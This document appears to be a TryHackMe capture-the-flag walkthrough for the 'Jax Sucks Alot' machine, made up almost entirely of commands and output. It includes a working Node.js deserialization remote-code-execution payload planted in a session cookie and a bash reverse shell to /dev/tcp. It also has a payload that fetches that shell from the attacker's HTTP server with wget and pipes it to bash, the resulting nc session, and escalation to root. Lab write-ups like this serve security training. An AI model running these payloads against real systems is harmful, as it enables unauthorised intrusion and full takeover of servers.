---
title: Jax Sucks Alot
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Jax Sucks
  Alot machine on TryHackMe.
slug: jax-sucks-alot
---




```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7a:0b:15:09:6a:c5:eb:48:8c:fd:d3:ae:61:88:64:a6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUwnK/kZhdje/oH5CORSUKEn4L8KnvTsdE7rcUX1J/57AfHHym5H0ZHtOH+IzfwqkAaEvzf0P6bcFmua4d9kq3NmIMzDo18oLi9j6afDXxf2Meobv61oyA/OKrEpEJq/+ut1qU9VmA7W8a1amerBU8cPhjiiOZBTNefuC8uyrgp7Lxcf1auwhK/MxOJ4VW1fd7QRKcdmiQAMYOduW1yRWEeHmWHU5B76lKG/EFf/YHXpk061RY1AzTVRf0JAIOlibbe+MBuc8rmoOBYSKSE6dNNQwkOPFi2Kv3KDBeOQTHw2JcCNtsoiMVvcR9DP97/TswRyw1JDfPK0qKqS/vyoBSB3zlZdx5P4mvfl8JpY3KwohP5kcYtnMyqtSjQJ81iiVoaI3k4Aifsa/TWMApaeShrZPwMe4cVCeq5vrETOW47xgVDg8ATbknS9HKve9gf4kQAtsOnG9/dgKpjAwDwoEyz8KzHv0GwdsA+DyT1vZeqKCBQKOgG+4PijT2BwKZulM=
|   256 f0:5e:66:0b:3a:e3:9f:bf:fa:be:76:73:72:51:e8:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOAr4qhCMIMll9/OPX49Q31llbfRf94Wq0QuAgJ3h6cjPNy6HsP1nxexHeU2pctJu2ba2IkwaqlCGezJicayQw=
|   256 58:1d:9e:20:22:b3:42:c8:39:fb:f3:43:a9:43:32:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZgZ/Rjnam3oJHtOk/0A+IiIAcZAYqEb7rUrXi6VbSe
80/tcp open  http    syn-ack ttl 62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8
|_http-title: Horror LLC
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 06 Dec 2025 18:48:20 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|     background-posi
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 06 Dec 2025 18:48:21 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi

```

```
POST /?email=test@email.com HTTP/1.1
Host: jax.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://jax.thm
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://jax.thm/
Priority: u=0
Content-Length: 0

```

```
HTTP/1.1 200 OK
Set-Cookie: session=eyJlbWFpbCI6InRlc3RAZW1haWwuY29tIn0=; Max-Age=900000; HttpOnly, Secure
Content-Type: text/html
Date: Sat, 06 Dec 2025 19:17:53 GMT
Connection: close
Content-Length: 3559

<html>
```

```
echo "eyJlbWFpbCI6IlRFU1RFUiJ9" | base64 -d
{"email":"TESTER"}                                      
```

> `Node.js deserialization vulnerabilities`

> `10.66.154.68` --> target

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

```
cat shell.sh  
bash -i >& /dev/tcp/my-ip/9001 0>&1
     
```

```
python -m http.server                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
_$$ND_FUNC$$_function (){\n \t require('child_process').exec('wget http://my-ip:8000/shell.sh|bash',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.153.193] from (UNKNOWN) [10.65.159.87] 46870
id
uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)
whoami
ubuntu
which python

ls
index.html
node_modules
package.json
package-lock.json
server.js
python3 -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@ip-10-65-159-87:/opt/webapp$
```

```
ubuntu@ip-10-65-159-87:/home/dylan$ cat /etc/crontab
cat /etc/crontab

# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

```
root@ip-10-65-159-87:~# sudo -l
sudo -l
Matching Defaults entries for root on ip-10-65-159-87:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ip-10-65-159-87:
    (ALL : ALL) ALL

```

```
root@ip-10-65-159-87:/# cd /root
cd /root
root@ip-10-65-159-87:~# ls
ls
root.txt
root@ip-10-65-159-87:~# cat root.txt

```